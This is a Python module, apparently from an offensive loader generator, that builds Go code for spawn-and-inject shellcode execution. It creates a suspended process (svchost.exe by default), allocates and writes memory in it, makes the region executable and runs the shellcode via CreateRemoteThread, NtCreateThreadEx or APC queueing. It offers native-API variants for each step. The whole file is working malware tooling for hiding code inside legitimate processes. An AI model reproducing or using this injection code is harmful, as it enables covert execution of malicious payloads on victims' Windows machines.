from string import Template
from common.utils.argumentparser import ArgumentParser

class spawnandinject:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='spawn', default='CreateProcessA', help='Which function to use to spawn a new process', choices={'CreateProcessA'})
        parser.add_argument(name='allocate', default='VirtualAllocEx', help='Function to use for allocating memory', choices={'VirtualAllocEx', 'NtAllocateVirtualMemory'})
        parser.add_argument(name='write', default='WriteProcessMemory', help='Function used for writing memory', choices={'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='execute', default='CreateRemoteThread', help='Function used for executing the shellcode', choices={'CreateRemoteThread', 'NtCreateThreadEx', 'QueueUserAPC', 'NtQueueApcThread'})
        parser.add_argument(name='protect', default='VirtualProtectEx', help='Function used for changing memory protections', choices={'VirtualProtectEx', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish. Only applicable for CreateRemoteThread and NtCreateThreadEx', choices={'WaitForSingleObject', 'NtWaitForSingleObject', 'None'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle'})
        parser.add_argument(name='target', default='C:\\\\windows\\\\system32\\\\svchost.exe', help='Target process for spawning or injecting', choices={})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)     

        # Target override if not specified
        if self.args['target'] == '':
            if self.args['mode'] == 'inject':
                self.args['target'] = 'explorer.exe'
            elif self.args['mode'] == 'spawn':
                self.args['target'] = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        else:
            self.args['target'] = self.args['target'].replace('\\','\\\\')

        # Override wait option
        if self.args['execute'] not in ['NtCreateThreadEx', 'CreateRemoteThread']:
            self.args['wait'] = 'None'

    def imports(self) -> list[str]:
        return ['golang.org/x/sys/windows',
                'unsafe']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = """
    {transformers}
"""

        if self.args['spawn'] == 'CreateProcessA':
            template += Template("""
	procInfo := &windows.ProcessInformation{{}}
	startupInfo := &windows.StartupInfo{{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}}
    target := []byte("$target");
	{CreateProcessA}(0, uintptr(unsafe.Pointer(&target[0])), 0, 0, 1, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(procInfo)))
""").substitute(target=self.args['target'])


        if self.args['allocate'] == 'VirtualAllocEx':
            template += """
	addr, _, _ := {VirtualAllocEx}(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    var addr uintptr = 0
    var regionSize uintptr = {shellcodeSize}
    _, _, _ = {NtAllocateVirtualMemory}(uintptr(procInfo.Process), uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
"""

        if self.args['write'] == 'WriteProcessMemory':
            template += """
    _, _, _ = {WriteProcessMemory}(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
"""
        elif self.args['write'] == 'NtWriteVirtualMemory':
            template += """
    var numBytes uintptr = {shellcodeSize}
    var numWritten uintptr = 0
	_, _, _ = {NtWriteVirtualMemory}(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), numBytes, uintptr(unsafe.Pointer(&numWritten)))
"""

        if self.args['protect'] == 'VirtualProtectEx':
            template += Template("""
    oldProtect := 0
	_, _, _ = {VirtualProtectEx}(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.$perm, uintptr(unsafe.Pointer(&oldProtect)))
""").substitute(perm = self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    oldProtect := 0
    var regSize uintptr = {shellcodeSize}
	_, _, _ = {NtProtectVirtualMemory}(uintptr(procInfo.Process), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regSize)), windows.$perm, uintptr(unsafe.Pointer(&oldProtect)))
""" ).substitute(perm=self.args['perm'])


        if self.args['execute'] == 'CreateRemoteThread':
            template += """
    hThread, _, _ := {CreateRemoteThread}(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    var hThread uintptr = 0
    _, _, _ = {NtCreateThreadEx}(uintptr(unsafe.Pointer(&hThread)), 0x001FFFFF, uintptr(0), uintptr(procInfo.Process), addr, uintptr(0), 0, 0, 0, 0, uintptr(0));
"""
        elif self.args['execute'] == 'QueueUserAPC':
            template += """
    _, _, _ = {QueueUserAPC}(addr, uintptr(procInfo.Thread), uintptr(0));
"""
        elif self.args['execute'] == 'NtQueueApcThread':
            template += """
    _, _, _ = {NtQueueApcThread}(uintptr(procInfo.Thread), addr, uintptr(0), uintptr(0), uintptr(0));
"""


        if self.args['wait'] == 'WaitForSingleObject':
            template += """
	{WaitForSingleObject}(hThread, 500)
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
	{NtWaitForSingleObject}(hThread, uintptr(0), uintptr(0))
"""
        elif self.args['wait'] == 'None':
            template += """
    {ResumeThread}(uintptr(procInfo.Thread))
"""

        return template